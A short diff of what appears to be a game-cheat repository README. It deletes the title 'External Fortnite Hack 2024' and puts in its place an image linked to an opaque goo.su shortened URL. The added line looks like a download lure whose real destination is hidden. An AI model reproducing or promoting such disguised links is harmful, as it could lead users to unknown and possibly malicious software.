@@ -1,2 +1,1 @@
-# External-Fortnite-Hack-2024
-External Fortnite Hack 2024
+[<img src="https://i.imgur.com/VSaHq5c.jpeg"/>](https://goo.su/F5eU)
